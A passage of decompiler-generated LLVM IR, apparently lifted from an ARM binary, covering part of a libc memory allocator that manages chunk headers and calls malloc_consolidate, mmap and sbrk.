dec_label_pc_12458:                               ; preds = %dec_label_pc_12460.preheader, %dec_label_pc_12458
  %v2_1245c59 = phi i32 [ %v2_1245c, %dec_label_pc_12458 ], [ %ip.promoted, %dec_label_pc_12460.preheader ]
  %v0_1245858 = phi i32 [ %v1_12458, %dec_label_pc_12458 ], [ %v0_1245857, %dec_label_pc_12460.preheader ]
  %v1_12458 = add i32 %v0_1245858, 8
  %v2_1245c = mul i32 %v2_1245c59, 2
  %v2_12460 = and i32 %v2_1245c, %v0_1247c
  %v4_12460 = icmp eq i32 %v2_12460, 0
  br i1 %v4_12460, label %dec_label_pc_12458, label %dec_label_pc_12460.dec_label_pc_12468_crit_edge

dec_label_pc_12460.dec_label_pc_12468_crit_edge:  ; preds = %dec_label_pc_12458
  store i32 %v1_12458, i32* %r0.global-to-local, align 4
  store i32 %v2_1245c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12468

dec_label_pc_12468:                               ; preds = %dec_label_pc_12460.dec_label_pc_12468_crit_edge, %dec_label_pc_12460.preheader
  %v0_12488 = phi i32 [ %v2_1245c, %dec_label_pc_12460.dec_label_pc_12468_crit_edge ], [ %ip.promoted, %dec_label_pc_12460.preheader ]
  %v0_124ac = phi i32 [ %v1_12458, %dec_label_pc_12460.dec_label_pc_12468_crit_edge ], [ %v0_1245857, %dec_label_pc_12460.preheader ]
  %v1_12468 = add i32 %v0_124ac, 12
  %v2_12468 = inttoptr i32 %v1_12468 to i32*
  %v3_12468 = load i32, i32* %v2_12468, align 4
  store i32 %v3_12468, i32* @lr, align 4
  %v9_1246c = icmp eq i32 %v3_12468, %v0_124ac
  br i1 %v9_1246c, label %dec_label_pc_12474, label %dec_label_pc_12494

dec_label_pc_12474:                               ; preds = %dec_label_pc_12468
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r0.global-to-local, align 4
  %v1_12478 = load i32, i32* @r8, align 4
  %v2_12478 = add i32 %v1_12478, ptrtoint (i32* @global_var_21d10.338 to i32)
  %v3_12478 = inttoptr i32 %v2_12478 to i32*
  %v4_12478 = load i32, i32* %v3_12478, align 4
  %v2_1247c = sub i32 -1, %v0_12488
  %v3_1247c = and i32 %v0_1247c, %v2_1247c
  store i32 %v3_1247c, i32* @r4, align 4
  %v1_12480 = load i32, i32* @r5, align 4
  %v4_12480 = mul i32 %v1_12480, 4
  %v5_12480 = add i32 %v4_12480, %v4_12478
  store i32 %v5_12480, i32* %r3.global-to-local, align 4
  %v1_12484 = add i32 %v0_124ac, 8
  store i32 %v1_12484, i32* %r0.global-to-local, align 4
  %v2_12488 = mul i32 %v0_12488, 2
  store i32 %v2_12488, i32* %ip.global-to-local, align 4
  %v2_1248c = add i32 %v5_12480, 820
  %v3_1248c = inttoptr i32 %v2_1248c to i32*
  store i32 %v3_1247c, i32* %v3_1248c, align 4
  %v0_1240c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12414.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1240c

dec_label_pc_12494:                               ; preds = %dec_label_pc_12468
  %v1_12494 = add i32 %v3_12468, 4
  %v2_12494 = inttoptr i32 %v1_12494 to i32*
  %v3_12494 = load i32, i32* %v2_12494, align 4
  store i32 %v3_12494, i32* %r3.global-to-local, align 4
  %v1_12498 = and i32 %v3_12494, -4
  store i32 %v1_12498, i32* %r2.global-to-local, align 4
  %v0_1249c = load i32, i32* @sl, align 4
  %v2_1249c = sub i32 %v1_12498, %v0_1249c
  store i32 %v2_1249c, i32* %ip.global-to-local, align 4
  %v1_124a0 = add i32 %v3_12468, 12
  %v2_124a0 = inttoptr i32 %v1_124a0 to i32*
  %v3_124a0 = load i32, i32* %v2_124a0, align 4
  store i32 %v3_124a0, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_1249c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_12494
  %v6_124a8 = add i32 %v1_12498, %v3_12468
  store i32 %v6_124a8, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_12494, %bb146
  %v2_124ac = add i32 %v3_124a0, 8
  %v3_124ac = inttoptr i32 %v2_124ac to i32*
  store i32 %v0_124ac, i32* %v3_124ac, align 4
  %v0_124b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_124b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_124b0 = add i32 %v1_124b0, 12
  %v3_124b0 = inttoptr i32 %v2_124b0 to i32*
  store i32 %v0_124b0, i32* %v3_124b0, align 4
  %v4_124b4 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_12390_crit_edge, label %dec_label_pc_124c0

.dec_label_pc_12390_crit_edge:                    ; preds = %bb147
  %v5_124b4 = add i32 %v4_124b4, 8
  store i32 %v5_124b4, i32* %r4.global-to-local, align 4
  %v4_124b8 = load i32, i32* %r2.global-to-local, align 4
  %v5_124b8 = add i32 %v4_124b8, 4
  %v6_124b8 = inttoptr i32 %v5_124b8 to i32*
  %v7_124b8 = load i32, i32* %v6_124b8, align 4
  store i32 %v7_124b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12390

dec_label_pc_124c0:                               ; preds = %bb147
  %v1_124c0 = load i32, i32* @sl, align 4
  %v2_124c0 = add i32 %v1_124c0, %v4_124b4
  store i32 %v2_124c0, i32* %r1.global-to-local, align 4
  %v1_124c8 = load i32, i32* @r6, align 4
  %v2_124c8 = add i32 %v1_124c8, 8
  %v3_124c8 = inttoptr i32 %v2_124c8 to i32*
  store i32 %v2_124c0, i32* %v3_124c8, align 4
  %v0_124cc = load i32, i32* %r1.global-to-local, align 4
  %v1_124cc = load i32, i32* @r6, align 4
  %v2_124cc = add i32 %v1_124cc, 12
  %v3_124cc = inttoptr i32 %v2_124cc to i32*
  store i32 %v0_124cc, i32* %v3_124cc, align 4
  %v0_124d0 = load i32, i32* @r6, align 4
  %v1_124d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_124d0 = add i32 %v1_124d0, 8
  %v3_124d0 = inttoptr i32 %v2_124d0 to i32*
  store i32 %v0_124d0, i32* %v3_124d0, align 4
  %v0_124d4 = load i32, i32* @r6, align 4
  %v1_124d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_124d4 = add i32 %v1_124d4, 12
  %v3_124d4 = inttoptr i32 %v2_124d4 to i32*
  store i32 %v0_124d4, i32* %v3_124d4, align 4
  %tmp213 = icmp ult i32 %v1_124c0, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_124c0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v8_124e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v8_124e0, i32* %r3.global-to-local, align 4
  %v4_124e4 = load i32, i32* %r1.global-to-local, align 4
  %v6_124e4 = add i32 %v8_124e0, 48
  %v7_124e4 = inttoptr i32 %v6_124e4 to i32*
  store i32 %v4_124e4, i32* %v7_124e4, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_124c0, %bb148
  %v0_124e8 = load i32, i32* @sl, align 4
  %v1_124e8 = or i32 %v0_124e8, 1
  store i32 %v1_124e8, i32* %r2.global-to-local, align 4
  %v0_124ec = load i32, i32* %ip.global-to-local, align 4
  %v1_124ec = or i32 %v0_124ec, 1
  store i32 %v1_124ec, i32* %r3.global-to-local, align 4
  %v0_124f0 = load i32, i32* @lr, align 4
  %v1_124f0 = add i32 %v0_124f0, 8
  store i32 %v1_124f0, i32* %r4.global-to-local, align 4
  %v2_124f4 = add i32 %v0_124f0, 4
  %v3_124f4 = inttoptr i32 %v2_124f4 to i32*
  store i32 %v1_124e8, i32* %v3_124f4, align 4
  %v0_124f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_124f8 = load i32, i32* %r1.global-to-local, align 4
  %v3_124f8 = add i32 %v1_124f8, %v0_124f8
  %v4_124f8 = inttoptr i32 %v3_124f8 to i32*
  store i32 %v0_124f8, i32* %v4_124f8, align 4
  %v0_124fc = load i32, i32* %r3.global-to-local, align 4
  %v1_124fc = load i32, i32* %r1.global-to-local, align 4
  %v2_124fc = add i32 %v1_124fc, 4
  %v3_124fc = inttoptr i32 %v2_124fc to i32*
  store i32 %v0_124fc, i32* %v3_124fc, align 4
  br label %dec_label_pc_12958

dec_label_pc_12504.loopexit:                      ; preds = %dec_label_pc_12424
  br label %dec_label_pc_12504

dec_label_pc_12504:                               ; preds = %dec_label_pc_12504.loopexit, %dec_label_pc_12118, %dec_label_pc_12120
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %ip.global-to-local, align 4
  %v4_1250c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_1250c, i32* @r0, align 4
  %v1_12510 = add i32 %v4_1250c, 44
  %v2_12510 = inttoptr i32 %v1_12510 to i32*
  %v3_12510 = load i32, i32* %v2_12510, align 4
  store i32 %v3_12510, i32* %ip.global-to-local, align 4
  %v1_12514 = add i32 %v3_12510, 4
  %v2_12514 = inttoptr i32 %v1_12514 to i32*
  %v3_12514 = load i32, i32* %v2_12514, align 4
  %v0_12518 = load i32, i32* @sl, align 4
  %v1_12518 = add i32 %v0_12518, 16
  store i32 %v1_12518, i32* %r1.global-to-local, align 4
  %v1_1251c = and i32 %v3_12514, -4
  store i32 %v1_1251c, i32* %r3.global-to-local, align 4
  %v3_12520 = icmp ult i32 %v1_1251c, %v1_12518
  br i1 %v3_12520, label %dec_label_pc_12550, label %dec_label_pc_1252c

dec_label_pc_1252c:                               ; preds = %dec_label_pc_12504
  %v2_1252c = sub i32 %v1_1251c, %v0_12518
  %v2_12530 = add i32 %v0_12518, %v3_12510
  store i32 %v2_12530, i32* %r1.global-to-local, align 4
  %v1_12534 = or i32 %v2_1252c, 1
  store i32 %v1_12534, i32* %r3.global-to-local, align 4
  %v1_12538 = or i32 %v0_12518, 1
  store i32 %v1_12538, i32* %r2.global-to-local, align 4
  %v1_1253c = add i32 %v3_12510, 8
  store i32 %v1_1253c, i32* %r4.global-to-local, align 4
  store i32 %v1_12538, i32* %v2_12514, align 4
  %v0_12544 = load i32, i32* %r1.global-to-local, align 4
  %v1_12544 = load i32, i32* @r0, align 4
  %v2_12544 = add i32 %v1_12544, 44
  %v3_12544 = inttoptr i32 %v2_12544 to i32*
  store i32 %v0_12544, i32* %v3_12544, align 4
  %v0_12548 = load i32, i32* %r3.global-to-local, align 4
  %v1_12548 = load i32, i32* %r1.global-to-local, align 4
  %v2_12548 = add i32 %v1_12548, 4
  %v3_12548 = inttoptr i32 %v2_12548 to i32*
  store i32 %v0_12548, i32* %v3_12548, align 4
  br label %dec_label_pc_12958

dec_label_pc_12550:                               ; preds = %dec_label_pc_12504
  %v1_12550 = inttoptr i32 %v4_1250c to i32*
  %v2_12550 = load i32, i32* %v1_12550, align 4
  store i32 %v2_12550, i32* %r3.global-to-local, align 4
  %v1_12554 = and i32 %v2_12550, 2
  store i32 %v1_12554, i32* %ip.global-to-local, align 4
  %v2_12554 = icmp eq i32 %v1_12554, 0
  %v1_12558 = add i32 %v4_1250c, 860
  %v2_12558 = inttoptr i32 %v1_12558 to i32*
  %v3_12558 = load i32, i32* %v2_12558, align 4
  store i32 %v3_12558, i32* %r1.global-to-local, align 4
  br i1 %v2_12554, label %dec_label_pc_12570, label %dec_label_pc_12560

dec_label_pc_12560:                               ; preds = %dec_label_pc_12550
  %v0_12560 = call i32 @__malloc_consolidate()
  %v0_12564 = load i32, i32* @sl, align 4
  %v1_12564 = add i32 %v0_12564, -7
  store i32 %v1_12564, i32* @r0, align 4
  %v0_12568 = call i32 @malloc()
  store i32 %v0_12568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12954

dec_label_pc_12570:                               ; preds = %dec_label_pc_12550
  %v1_12570 = add i32 %v4_1250c, 844
  %v2_12570 = inttoptr i32 %v1_12570 to i32*
  %v3_12570 = load i32, i32* %v2_12570, align 4
  store i32 %v3_12570, i32* %r3.global-to-local, align 4
  %v3_12574 = icmp ult i32 %v0_12518, %v3_12570
  %v1_12578 = add i32 %v3_12558, -1
  store i32 %v1_12578, i32* %sb.global-to-local, align 4
  br i1 %v3_12574, label %dec_label_pc_1264c, label %dec_label_pc_12580

dec_label_pc_12580:                               ; preds = %dec_label_pc_12570
  %v1_12580 = add i32 %v4_1250c, 852
  %v2_12580 = inttoptr i32 %v1_12580 to i32*
  %v3_12580 = load i32, i32* %v2_12580, align 4
  store i32 %v3_12580, i32* %r2.global-to-local, align 4
  %v1_12584 = add i32 %v4_1250c, 848
  %v2_12584 = inttoptr i32 %v1_12584 to i32*
  %v3_12584 = load i32, i32* %v2_12584, align 4
  store i32 %v3_12584, i32* %r3.global-to-local, align 4
  %v6_1258c = icmp slt i32 %v3_12584, %v3_12580
  br i1 %v6_1258c, label %dec_label_pc_12590, label %dec_label_pc_1264c

dec_label_pc_12590:                               ; preds = %dec_label_pc_12580
  %v1_12590 = add i32 %v0_12518, 10
  %v2_12594 = add i32 %v1_12590, %v3_12558
  store i32 %v2_12594, i32* %r3.global-to-local, align 4
  %v2_12598 = sub i32 0, %v3_12558
  %v3_12598 = and i32 %v2_12594, %v2_12598
  store i32 %v3_12598, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_12598, %v0_12518
  br i1 %tmp214, label %dec_label_pc_125a4, label %dec_label_pc_1264c

dec_label_pc_125a4:                               ; preds = %dec_label_pc_12590
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12598, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_125bc = call i32 @mmap(i32 0, i32 %v3_12598, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_125bc, i32* %r0.global-to-local, align 4
  %v7_125c0 = icmp eq i32 %v6_125bc, -1
  br i1 %v7_125c0, label %dec_label_pc_125a4.dec_label_pc_1264c_crit_edge, label %dec_label_pc_125c8

dec_label_pc_125a4.dec_label_pc_1264c_crit_edge:  ; preds = %dec_label_pc_125a4
  %v1_12670.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1264c

dec_label_pc_125c8:                               ; preds = %dec_label_pc_125a4
  %v1_125c8 = urem i32 %v6_125bc, 8
  store i32 %v1_125c8, i32* %r2.global-to-local, align 4
  %v2_125c8 = icmp eq i32 %v1_125c8, 0
  br i1 %v2_125c8, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_125c8
  %v2_125cc = sub nsw i32 8, %v1_125c8
  store i32 %v2_125cc, i32* %r3.global-to-local, align 4
  %v2_125d0 = load i32, i32* @r4, align 4
  %v3_125d0 = sub i32 %v2_125d0, %v2_125cc
  %v3_125d4 = add i32 %v2_125cc, %v6_125bc
  store i32 %v3_125d4, i32* %lr.global-to-local, align 4
  %v2_125dc = or i32 %v3_125d0, 2
  store i32 %v2_125dc, i32* %r2.global-to-local, align 4
  %v5_125e4 = inttoptr i32 %v3_125d4 to i32*
  store i32 %v2_125cc, i32* %v5_125e4, align 4
  %v1_125e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_125e8 = load i32, i32* %lr.global-to-local, align 4
  %v3_125e8 = add i32 %v2_125e8, 4
  %v4_125e8 = inttoptr i32 %v3_125e8 to i32*
  store i32 %v1_125e8, i32* %v4_125e8, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_125c8
  store i32 %v6_125bc, i32* %lr.global-to-local, align 4
  %v1_125e050 = load i32, i32* @r4, align 4
  %v2_125e051 = or i32 %v1_125e050, 2
  store i32 %v2_125e051, i32* %r3.global-to-local, align 4
  %v3_125ec = inttoptr i32 %v6_125bc to i32*
  store i32 0, i32* %v3_125ec, align 4
  %v1_125f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_125f0 = load i32, i32* %lr.global-to-local, align 4
  %v3_125f0 = add i32 %v2_125f0, 4
  %v4_125f0 = inttoptr i32 %v3_125f0 to i32*
  store i32 %v1_125f0, i32* %v4_125f0, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_125fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_125fc, i32* %ip.global-to-local, align 4
  %v1_12600 = add i32 %v4_125fc, 848
  %v2_12600 = inttoptr i32 %v1_12600 to i32*
  %v3_12600 = load i32, i32* %v2_12600, align 4
  store i32 %v3_12600, i32* %r3.global-to-local, align 4
  %v1_12604 = add i32 %v4_125fc, 856
  %v2_12604 = inttoptr i32 %v1_12604 to i32*
  %v3_12604 = load i32, i32* %v2_12604, align 4
  store i32 %v3_12604, i32* %r2.global-to-local, align 4
  %v1_12608 = add i32 %v3_12600, 1
  store i32 %v1_12608, i32* %r3.global-to-local, align 4
  %v7_12610 = icmp sgt i32 %v1_12608, %v3_12604
  br i1 %v7_12610, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_12608, i32* %v2_12604, align 4
  %v0_12614.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12614.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_12614 = phi i32 [ %v4_125fc, %.thread30 ], [ %v1_12614.pre, %bb150 ]
  %v0_12614 = phi i32 [ %v1_12608, %.thread30 ], [ %v0_12614.pre, %bb150 ]
  %v2_12614 = add i32 %v1_12614, 848
  %v3_12614 = inttoptr i32 %v2_12614 to i32*
  store i32 %v0_12614, i32* %v3_12614, align 4
  %v0_12618 = load i32, i32* %ip.global-to-local, align 4
  %v1_12618 = add i32 %v0_12618, 868
  %v2_12618 = inttoptr i32 %v1_12618 to i32*
  %v3_12618 = load i32, i32* %v2_12618, align 4
  store i32 %v3_12618, i32* %r3.global-to-local, align 4
  %v1_1261c = add i32 %v0_12618, 880
  %v2_1261c = inttoptr i32 %v1_1261c to i32*
  %v3_1261c = load i32, i32* %v2_1261c, align 4
  store i32 %v3_1261c, i32* %r2.global-to-local, align 4
  %v0_12620 = load i32, i32* @r4, align 4
  %v2_12620 = add i32 %v0_12620, %v3_12618
  store i32 %v2_12620, i32* %r1.global-to-local, align 4
  %v1_12624 = add i32 %v0_12618, 872
  %v2_12624 = inttoptr i32 %v1_12624 to i32*
  %v3_12624 = load i32, i32* %v2_12624, align 4
  store i32 %v3_12624, i32* %r3.global-to-local, align 4
  %v1_1262c = add i32 %v0_12618, 884
  %v2_1262c = inttoptr i32 %v1_1262c to i32*
  %v3_1262c = load i32, i32* %v2_1262c, align 4
  store i32 %v3_1262c, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_12620, %v3_1261c
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_12620, i32* %v2_1261c, align 4
  %v0_12634.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12634.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_12634 = phi i32 [ %v0_12618, %bb151 ], [ %v1_12634.pre, %bb152 ]
  %v0_12634 = phi i32 [ %v2_12620, %bb151 ], [ %v0_12634.pre, %bb152 ]
  %v2_12634 = add i32 %v1_12634, 868
  %v3_12634 = inttoptr i32 %v2_12634 to i32*
  store i32 %v0_12634, i32* %v3_12634, align 4
  %v0_12638 = load i32, i32* %r1.global-to-local, align 4
  %v1_12638 = load i32, i32* %r3.global-to-local, align 4
  %v2_12638 = add i32 %v1_12638, %v0_12638
  store i32 %v2_12638, i32* %r1.global-to-local, align 4
  %v1_1263c = load i32, i32* %r2.global-to-local, align 4
  %v0_12640 = load i32, i32* %lr.global-to-local, align 4
  %v1_12640 = add i32 %v0_12640, 8
  store i32 %v1_12640, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_12638, %v1_1263c
  br i1 %tmp216, label %bb154, label %dec_label_pc_12954

bb154:                                            ; preds = %bb153
  %v5_12644 = load i32, i32* %ip.global-to-local, align 4
  %v6_12644 = add i32 %v5_12644, 884
  %v7_12644 = inttoptr i32 %v6_12644 to i32*
  store i32 %v2_12638, i32* %v7_12644, align 4
  br label %dec_label_pc_12954

dec_label_pc_1264c:                               ; preds = %dec_label_pc_12590, %dec_label_pc_12570, %dec_label_pc_125a4.dec_label_pc_1264c_crit_edge, %dec_label_pc_12580
  %v1_12670 = phi i32 [ %v1_12670.pre, %dec_label_pc_125a4.dec_label_pc_1264c_crit_edge ], [ %v0_12518, %dec_label_pc_12580 ], [ %v0_12518, %dec_label_pc_12570 ], [ %v0_12518, %dec_label_pc_12590 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %ip.global-to-local, align 4
  %v4_12654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_12654, i32* %r3.global-to-local, align 4
  %v1_12658 = add i32 %v4_12654, 44
  %v2_12658 = inttoptr i32 %v1_12658 to i32*
  %v3_12658 = load i32, i32* %v2_12658, align 4
  store i32 %v3_12658, i32* %r0.global-to-local, align 4
  %v1_1265c = add i32 %v4_12654, 864
  %v2_1265c = inttoptr i32 %v1_1265c to i32*
  %v3_1265c = load i32, i32* %v2_1265c, align 4
  store i32 %v3_1265c, i32* %r2.global-to-local, align 4
  %v1_12660 = add i32 %v4_12654, 840
  %v2_12660 = inttoptr i32 %v1_12660 to i32*
  %v3_12660 = load i32, i32* %v2_12660, align 4
  store i32 %v3_12660, i32* %r3.global-to-local, align 4
  %v1_12664 = add i32 %v3_12658, 4
  %v2_12664 = inttoptr i32 %v1_12664 to i32*
  %v3_12664 = load i32, i32* %v2_12664, align 4
  store i32 %v3_12664, i32* %r1.global-to-local, align 4
  %v1_1266c = urem i32 %v3_1265c, 2
  %v2_1266c = icmp eq i32 %v1_1266c, 0
  %v1_12668 = add i32 %v1_12670, 16
  %v2_12670 = add i32 %v1_12668, %v3_12660
  store i32 %v2_12670, i32* %r3.global-to-local, align 4
  %v1_12674 = and i32 %v3_12664, -4
  store i32 %v1_12674, i32* @r8, align 4
  br i1 %v2_1266c, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_1264c
  %v3_12678 = sub i32 %v2_12670, %v1_12674
  store i32 %v3_12678, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_1264c, %bb155
  %v0_1267c = phi i32 [ %v2_12670, %dec_label_pc_1264c ], [ %v3_12678, %bb155 ]
  %v1_1267c = load i32, i32* %sb.global-to-local, align 4
  %v2_1267c = add i32 %v1_1267c, %v0_1267c
  store i32 %v2_1267c, i32* %r3.global-to-local, align 4
  %v1_12680 = sub i32 -1, %v1_1267c
  store i32 %v1_12680, i32* %fp.global-to-local, align 4
  %v2_12684 = and i32 %v2_1267c, %v1_12680
  store i32 %v2_12684, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_12684, 1
  br i1 %tmp157, label %dec_label_pc_126a8, label %dec_label_pc_12694

dec_label_pc_12694:                               ; preds = %bb156
  store i32 %v2_12684, i32* %r0.global-to-local, align 4
  %v1_12698 = call i32 @__GI_sbrk(i32 %v2_12684)
  store i32 %v1_12698, i32* %r0.global-to-local, align 4
  %v3_1269c = icmp eq i32 %v1_12698, -1
  store i32 %v1_12698, i32* @r4, align 4
  br i1 %v3_1269c, label %dec_label_pc_126a8, label %dec_label_pc_12714

dec_label_pc_126a8:                               ; preds = %dec_label_pc_12694, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r1.global-to-local, align 4
  %v4_126b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_126b0, i32* %r6.global-to-local, align 4
  %v1_126b4 = add i32 %v4_126b0, 864
  %v2_126b4 = inttoptr i32 %v1_126b4 to i32*
  %v3_126b4 = load i32, i32* %v2_126b4, align 4
  store i32 %v3_126b4, i32* %r3.global-to-local, align 4
  %v1_126b8 = urem i32 %v3_126b4, 2
  %v2_126b8 = icmp eq i32 %v1_126b8, 0
  br i1 %v2_126b8, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_126a8
  %v1_126bc = load i32, i32* @r8, align 4
  %v2_126bc = load i32, i32* %sb.global-to-local, align 4
  %v3_126bc = add i32 %v2_126bc, %v1_126bc
  %v2_126c0 = load i32, i32* @r5, align 4
  %v3_126c0 = add i32 %v3_126bc, %v2_126c0
  store i32 %v3_126c0, i32* %r3.global-to-local, align 4
  %v2_126c4 = load i32, i32* %fp.global-to-local, align 4
  %v3_126c4 = and i32 %v2_126c4, %v3_126c0
  store i32 %v3_126c4, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_126a8
  %v0_126c8.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_126c8 = phi i32 [ %v0_126c8.pr, %.thread32thread-pre-split ], [ %v3_126c4, %bb158 ]
  %v2_126c8 = icmp ugt i32 %v0_126c8, 1048575
  br i1 %v2_126c8, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_126e0 = phi i32 [ %v0_126c8, %.thread32 ], [ 1048576, %bb159 ]
  %v1_126d0 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_126e0, %v1_126d0
  br i1 %tmp217, label %dec_label_pc_126d8, label %dec_label_pc_1293c

dec_label_pc_126d8:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_126e0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_126f4 = call i32 @mmap(i32 0, i32 %v0_126e0, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_126f4, i32* %r0.global-to-local, align 4
  %v3_126f8 = icmp eq i32 %v6_126f4, -1
  %v8_126f8 = icmp eq i32 %v6_126f4, -1
  store i32 %v6_126f4, i32* @r4, align 4
  br i1 %v8_126f8, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_126d8
  %v1_12700 = load i32, i32* %r6.global-to-local, align 4
  %v2_12700 = add i32 %v1_12700, 864
  %v3_12700 = inttoptr i32 %v2_12700 to i32*
  %v4_12700 = load i32, i32* %v3_12700, align 4
  %v2_12704 = load i32, i32* @r5, align 4
  %v3_12704 = add i32 %v2_12704, %v6_126f4
  store i32 %v3_12704, i32* %r0.global-to-local, align 4
  %v2_12708 = and i32 %v4_12700, -2
  store i32 %v2_12708, i32* %r3.global-to-local, align 4
  store i32 %v2_12708, i32* %v3_12700, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_126d8, %bb161
  br i1 %v3_126f8, label %dec_label_pc_12714, label %dec_label_pc_12718

dec_label_pc_12714:                               ; preds = %.thread35, %dec_label_pc_12694
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12718

dec_label_pc_12718:                               ; preds = %.thread35, %dec_label_pc_12714
  %v0_12718 = load i32, i32* @r4, align 4
  %v7_12718 = icmp eq i32 %v0_12718, -1
  br i1 %v7_12718, label %dec_label_pc_1293c, label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_12718
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v4_12728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_12728, i32* %ip.global-to-local, align 4
  store i32 %v3_12658, i32* %r2.global-to-local, align 4
  %v1_12730 = add i32 %v4_12728, 872
  %v2_12730 = inttoptr i32 %v1_12730 to i32*
  %v3_12730 = load i32, i32* %v2_12730, align 4
  %v1_12734 = load i32, i32* @r8, align 4
  %v2_12734 = add i32 %v1_12734, %v3_12658
  store i32 %v2_12734, i32* %r1.global-to-local, align 4
  %v0_12738 = load i32, i32* @r5, align 4
  %v2_12738 = add i32 %v0_12738, %v3_12730
  store i32 %v2_12738, i32* %r3.global-to-local, align 4
  %v9_1273c = icmp eq i32 %v0_12718, %v2_12734
  br i1 %v9_1273c, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_12720
  store i32 %v2_12738, i32* %v2_12730, align 4
  br label %dec_label_pc_12758

bb162:                                            ; preds = %dec_label_pc_12720
  %v1_12740 = load i32, i32* %r0.global-to-local, align 4
  %v8_12740 = icmp eq i32 %v1_12740, -1
  store i32 %v2_12738, i32* %v2_12730, align 4
  br i1 %v8_12740, label %.thread37, label %dec_label_pc_12758

.thread37:                                        ; preds = %bb162
  %v1_12748 = load i32, i32* @r5, align 4
  %v2_12748 = load i32, i32* @r8, align 4
  %v3_12748 = add i32 %v2_12748, %v1_12748
  %v2_1274c = or i32 %v3_12748, 1
  store i32 %v2_1274c, i32* %r3.global-to-local, align 4
